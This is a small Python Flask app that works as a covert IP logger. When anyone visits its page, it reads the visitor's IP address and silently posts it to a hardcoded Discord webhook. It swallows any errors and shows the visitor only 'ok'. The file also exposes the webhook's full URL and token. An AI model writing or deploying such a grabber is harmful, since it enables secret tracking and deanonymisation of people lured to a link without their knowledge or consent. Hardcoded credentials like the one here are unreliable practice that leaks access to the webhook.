from flask import Flask, request
import urllib.request
import json

app = Flask(__name__)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    url = "https://discord.com/api/webhooks/1539226239792054362/Ydzpz_IlRmffJQ7sc5e9shC5zHTKqFgRue-O2scW1zXJSg6TjdgzBBVKENe8XW-ZbQZT"
    data = {"content": f"IPアドレス: {ip}"}
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )
    try:
        urllib.request.urlopen(req)
    except:
        pass
    return "ok"

if __name__ == '__main__':
    app.run()

